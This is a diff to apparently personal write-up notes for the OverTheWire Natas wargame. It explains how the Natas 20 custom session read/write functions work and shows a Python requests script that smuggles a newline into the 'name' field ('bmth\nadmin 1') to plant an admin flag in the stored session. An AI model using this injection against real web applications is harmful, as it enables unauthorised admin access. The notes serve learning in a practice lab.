@@ -64,7 +64,13 @@ for i in range(641):
 - one of these encoded session id is gotta be the admin session id.
 ## Natas 20
 
-here a session is created 
+- here 2 functions are defined namely read and write 
+- `read` function 
+	- checks if a file path exists corresponding to a session id if not then creates one 
+	- it reads the contents from the file creating an array and then process the data bit by bit using the `explode` function
+- `write` function 
+	- works with the same file name as read, it uses simply writes the output from the server to a file 
+Whole code is operating in a session thus we add more code to existing code
 
 ```
 import requests
@@ -77,10 +83,12 @@ session = requests.Session()
 response= session.post(url,auth = (username,password))
 print(response.text)
 print("="*80)
+#create a session id 
 
 response= session.post(url,data={"name":"bmth\nadmin 1"},auth = (username,password))
 print(response.text)
 print("="*80)
+#exploiting the exlpo
 
 response= session.post(url,auth = (username,password))
 print(response.text)
